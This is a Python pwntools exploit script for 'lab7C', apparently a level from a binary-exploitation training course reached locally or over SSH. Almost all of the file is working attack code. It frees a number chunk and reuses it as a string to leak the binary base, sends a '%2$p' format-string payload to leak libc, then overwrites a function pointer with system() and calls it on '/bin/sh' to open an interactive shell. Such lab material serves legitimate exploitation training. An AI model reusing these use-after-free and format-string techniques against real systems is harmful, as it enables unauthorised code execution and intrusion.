#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python ssh.py LOCAL
# python ssh.py REMOTE IP=127.0.0.1 USER=challenge PASS=challenge
# python ssh.py REMOTE IP=127.0.0.1 PORT=22 USER=challenge PASS=challenge

settings = {

    # Path to binary
    "binary"        : "./lab7C",

    # Path to custom libc
    "libc"          : None,

    # Remote path to binary
    "remote_binary" : '/levels/lab07/lab7C'
}

def create_number(n):
    p.sendlineafter("Enter Choice: ", "2")
    p.sendline(str(n))

def delete_last_number():
    p.sendlineafter("Enter Choice: ", "4")

def create_string(s):
    p.sendlineafter("Enter Choice: ", "1")
    p.sendline(s)

def delete_last_string():
    p.sendlineafter("Enter Choice: ", "3")

def print_number(index):
    p.sendlineafter("Enter Choice: ", "6")
    p.sendlineafter("Number index to print: ", str(index))
    p.recvuntil("not 1337 enough: ")
    return int(p.recvline().strip())

def print_string(index):
    p.sendlineafter("Enter Choice: ", "5")
    p.sendline(str(index))
    p.recvuntil("String index to print: ")
    return p.recvline().strip()

# Exploit here
def exploit():

    # Create chunk
    create_number(0x1337)

    # Free chunk
    delete_last_number()

    # Re-use free'd chunk with string
    create_string("A")

    # Leak small_str()
    base = print_number(1) - 0xbc7
    printf = base + 0x880
    log.info("base : {}".format(hex(base)))
    log.info("printf : {}".format(hex(printf)))

    # Recrete string with format string payload
    delete_last_string()
    payload = "%2$p"
    create_string(payload)
    delete_last_string()

    # Reuse free'd string chunk to overwrite obj->func with printf()
    create_number(printf)

    # Leak libc
    leak = int(print_string(1), 16)

    # Calculate system
    # offset = 0x0e411a # local
    offset = 0x16aa90
    system = leak - offset
    log.info("system() : {}".format(hex(system)))

    # Recrete string with /bin/sh
    delete_last_number()
    payload = "/bin/sh"
    create_string(payload)
    delete_last_string()

    # Reuse free'd string chunk to overwrite obj->func with printf()
    create_number(system)

    # Shell
    p.sendlineafter("Enter Choice: ", "5")
    p.sendline("1")
    p.interactive()

    p.interactive()

# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.USER, args.PASS]):
            log.warning("Missing IP/USER/PASS arguments.")
            exit()


        shell = ssh(args.USER, args.IP, port = int(args.PORT) or 22,
                                    password = args.PASS)

        p = shell.process(settings['remote_binary'])

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
